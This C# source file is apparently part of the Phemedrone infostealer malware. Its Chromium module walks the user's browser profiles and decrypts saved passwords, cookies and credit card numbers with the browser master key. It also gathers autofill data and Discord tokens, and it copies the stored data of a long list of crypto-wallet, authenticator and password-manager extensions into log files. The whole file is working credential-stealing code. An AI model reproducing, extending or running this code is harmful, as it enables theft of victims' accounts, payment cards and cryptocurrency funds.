using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Phemedrone.Classes;
using Phemedrone.Cryptography;
using Phemedrone.Extensions;
using Phemedrone.Services.Browsers;

namespace Phemedrone.Services
{
    public class Chromium : IService, IBrowser
    {
        public override PriorityLevel Priority => PriorityLevel.High;


        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            foreach (var root in new List<string>
                     {
                         Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                         Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                     })
            {
                var creditCardList = new List<string>();
                foreach (var browserFolder in BrowserHelpers.ListBrowsers(root, (directory) =>
                             File.Exists(Path.Combine(directory, "User Data",
                                 "Local State")) || // average chromium browser
                             (File.Exists(Path.Combine(directory, "Local State")) && // dumb ass opera
                              File.Exists(Path.Combine(directory, "Module Info Cache")))))
                {
                    var browserName = GetBrowserName(root, browserFolder);
                    var browserRoot = Directory.Exists(Path.Combine(browserFolder, "User Data"))
                        ? Path.Combine(browserFolder, "User Data")
                        : browserFolder;
                    var browserVersion = NullableValue.Call(() =>
                        File.ReadAllText(Path.Combine(browserRoot, "Last Version"))) ?? "1.0.0.0";
                    var masterKey = BrowserHelpers.ParseMasterKey(Path.Combine(browserRoot, "Local State"));
                    var profileLocations = ListProfiles(browserRoot);
                    foreach (var profileLocation in profileLocations)
                    {
                        var profileName =
                            ParseProfileName(profileLocations, profileLocation); //profileLocation.Split('\\').Last();

                        var cookies = BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "Network", "Cookies"),
                            "cookies",
                            row =>
                            {
                                var hostname = Encoding.UTF8.GetString((byte[])row(1));
                                var httpOnly = hostname.StartsWith(".").ToString().ToUpper();
                                var path = Encoding.UTF8.GetString((byte[])row(6));
                                var secure = ((ulong)row(8) == 1).ToString().ToUpper();
                                var expires = (ulong)row(7);
                                var name = Encoding.UTF8.GetString((byte[])row(3));
                                var value = AesGcm.DecryptValue((byte[])row(5), masterKey);
                                BrowserHelpers.CookiesTags(hostname);
                                if (value.Length < 1) return null;
                                
                                return BrowserHelpers.FormatCookie(hostname, httpOnly, path, secure,
                                    (long)expires, name, value);
                            });

                        var autoFills = BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "Web Data"),
                            "autofill",
                            row =>
                            {
                                var name = Encoding.UTF8.GetString((byte[])row(0));
                                var value = Encoding.UTF8.GetString((byte[])row(1));
                                return BrowserHelpers.FormatAutofill(name, value);
                            });

                        ServiceCounter.PasswordList.AddRange(BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "Login Data"),
                            "logins",
                            row =>
                            {
                                var url = Encoding.UTF8.GetString((byte[])row(0));
                                var username = Encoding.UTF8.GetString((byte[])row(3));
                                var password = AesGcm.DecryptValue((byte[])row(5), masterKey);
                                BrowserHelpers.PasswordsTags(url);
                                return BrowserHelpers.FormatPassword(url, username, password, browserName,
                                    browserVersion, profileName);
                            }));
                        
                        array.AddRange(ParseExtensions(profileLocation, browserName, profileName));


                        creditCardList.AddRange(BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "Web Data"),
                            "credit_cards",
                            row =>
                            {
                                var placeholder = Encoding.UTF8.GetString((byte[])row(1));
                                var month = (ulong)row(2);
                                var year = (ulong)row(3);
                                var number = AesGcm.DecryptValue((byte[])row(4), masterKey);
                                if (number.Length < 1) return null;
                                
                                return BrowserHelpers.FormatCreditCard(number, placeholder, (long)month, (long)year,
                                    browserName,
                                    browserVersion, profileName);
                            }));

                        if (cookies.Count > 0)
                            array.Add(new LogRecord
                            {
                                Path = $"Browser Data/Cookies_{browserName}[{profileName}].txt",
                                Content = Encoding.UTF8.GetBytes(string.Join("\r\n", cookies))
                            });

                        if (autoFills.Count > 0)
                            array.Add(new LogRecord
                            {
                                Path = $"Browser Data/AutoFills_{browserName}[{profileName}].txt",
                                Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", autoFills))
                            });

                        var levelDbLocation = Path.Combine(profileLocation, "Local Storage", "leveldb");
                        if (!Directory.Exists(levelDbLocation)) continue;

                        ServiceCounter.DiscordList.AddRange(
                            BrowserHelpers.ParseDiscordTokens(levelDbLocation, masterKey));
                    }
                }

                // no need to add parsed credit cards to global list as
                // we do not grab gecko credit cards 

                if (creditCardList.Count > 0)
                {
                    array.Add(new LogRecord
                    {
                        Path = "CreditCards.txt",
                        Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", creditCardList))
                    });
                }
            }


            return array.ToArray();
        }

        public string GetBrowserName(string root, string location)
        {
            var parts = location.Replace(root + "\\", null).Split('\\');
            return parts.Length > 2 ? parts[1] : parts.Last();
        }

        public List<string> ListProfiles(string rootLocation)
        {
            return File.Exists(Path.Combine(rootLocation, "Network", "Cookies"))
                ? new List<string>(new[] { rootLocation })
                : Directory.GetDirectories(rootLocation, "Profile*")
                    .Concat(Directory.GetDirectories(rootLocation, "Default")).ToList();
        }

        private static string ParseProfileName(List<string> profiles, string path)
        {
            return profiles.Count == 1 && !profiles.First().Contains("Default")
                ? "Default"
                : path.Split('\\').Last();
        }

        private static List<LogRecord> ParseExtensions(string profileLocation, string browserName, string profileName)
        {
            var browserExtensions = new Dictionary<string, string>() // If you about to add new write {"Name", "id"},
            {
                { "Authenticator", "bhghoamapcdpbohphigoooaddinpkbai" },
                { "EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal" },
                { "BrowserPass", "naepdomgkenhinolocfifgehidddafch" },
                { "MYKI", "bmikpgodpkclnkgmnpphehdgcimmided" },
                { "Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb" },
                { "CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded" },
                { "Zoho Vault", "igkpcodhieompeloncfnbekccinhapdb" },
                { "Norton Password Manager", "admmjipmmciaobhojoghlmleefbicajg" },
                { "Avira Password Manager", "caljgklbbfbcjjanaijlacgncafpegll" },
                { "Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk" },
                { "MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn" },
                { "TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec" },
                { "BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp" },
                { "Coin98", "aeachknmefphepccionboohckonoeemg" },
                { "iWallet", "kncchdigobghenbbaddojjnnaogfppfj" },
                { "Wombat", "amkmjjmmflddogmhpjloimipbofnfjih" },
                { "MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm" },
                { "NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao" },
                { "Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp" },
                { "Keplr", "dmkamcknogkgcdfhhbddcghachkejeap" },
                { "Sollet", "fhmfendgdocmcbmfikdcogofphimnkno" },
                { "ICONex", "flpiciilemghbmfalicajoolhkkenfel" },
                { "KHC", "hcflpincpppdclinealmandijcmnkbgn" },
                { "TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh" },
                { "Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd" },
                { "OneKey", "ilbbpajmiplgpehdikmejfemfklpkmke" },
                { "Trust Wallet", "pknlccmneadmjbkollckpblgaaabameg" },
                { "MetaWallet", "pfknkoocfefiocadajpngdknmkjgakdg" },
                { "Guarda Wallet", "fcglfhcjfpkgdppjbglknafgfffkelnm" },
                { "Exodus", "idkppnahnmmggbmfkjhiakkbkdpnmnon" },
                { "Jaxx Liberty", "mhonjhhcgphdphdjcdoeodfdliikapmj" },
                { "Atomic Wallet", "bhmlbgebokamljgnceonbncdofmmkedg" },
                { "Electrum", "hieplnfojfccegoloniefimmbfjdgcgp" },
                { "Mycelium", "pidhddgciaponoajdngciiemcflpnnbg" },
                { "Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh" },
                { "GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj" },
                { "Edge", "doljkehcfhidippihgakcihcmnknlphh" },
                { "BRD", "nbokbjkelpmlgflobbohapifnnenbjlh" },
                { "Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi" },
                { "Copay", "ieedgmmkpkbiblijbbldefkomatsuahh" },
                { "Bread", "jifanbgejlbcmhbbdbnfbfnlmbomjedj" },
                { "Airbitz", "ieedgmmkpkbiblijbbldefkomatsuahh" },
                { "KeepKey", "dojmlmceifkfgkgeejemfciibjehhdcl" },
                { "Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh" },
                { "Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln" },
                { "Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm" },
                { "Bitbox", "ocmfilhakdbncmojmlbagpkjfbmeinbd" },
                { "Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing" },
                { "YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc" },
                { "Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd" },
                { "Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn" },
                { "Authy", "gjffdbjndmcafeoehgdldobgjmlepcal" },
                { "Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj" },
                { "OTP Auth", "bobfejfdlhnabgglompioclndjejolch" },
                { "FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn" },
                { "Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm" },
                { "LastPass Authenticator", "cfoajccjibkjhbdjnpkbananbejpkkjb" },
                { "Dashlane", "flikjlpgnpcjdienoojmgliechmmheek" },
                { "Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj" },
                { "RoboForm", "hppmchachflomkejbhofobganapojjol" },
                { "KeePass", "lbfeahdfdkibininjgejjgpdafeopflb" },
                { "KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca" },
                { "Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki" },
                { "NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl" },
                { "LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb" },
            };
            var array = new List<LogRecord>();
            foreach (var keyValue in browserExtensions)
            {
                var path = Path.Combine(profileLocation, "Local Extension Settings", keyValue.Value);
                if (!Directory.Exists(path)) continue;

                ServiceCounter.ExtensionsCount++;
                var files = Directory.GetFiles(path);
                foreach (var file in files)
                {
                    var content = NullableValue.Call(() => File.ReadAllBytes(file));
                    if (content == null) continue;
                    var filename = Path.GetFileName(file);
                    array.Add(new LogRecord
                    {
                        Path = "Browser Data/Extensions/" + $"{keyValue.Key}_{browserName}_{profileName}" + "/" + filename,
                        Content = content
                    });
                }
            }

            return array;
        }
    }
}